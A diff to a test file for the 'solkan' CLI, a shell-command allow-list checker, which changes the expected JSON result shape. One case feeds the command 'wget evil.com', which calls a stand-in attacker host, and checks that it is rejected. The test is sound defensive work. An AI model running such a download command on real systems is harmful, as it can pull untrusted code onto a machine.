@@ -30,8 +30,7 @@ describe('solkan CLI', () => {
         args: "--allow-list echo 'echo hello'",
         expectedExitCode: 0,
         expectedJson: {
-          isAllowed: true,
-          commands: { allowed: ['echo'], rejected: [] },
+          allow: { isAllowed: true, allowed: ['echo'], rejected: [] },
         },
       },
       {
@@ -39,8 +38,7 @@ describe('solkan CLI', () => {
         args: "--allow-list echo 'wget evil.com'",
         expectedExitCode: 1,
         expectedJson: {
-          isAllowed: false,
-          commands: { allowed: [], rejected: ['wget'] },
+          allow: { isAllowed: false, allowed: [], rejected: ['wget'] },
         },
       },
     ])('$title', async ({ args, expectedExitCode, expectedJson }) => {
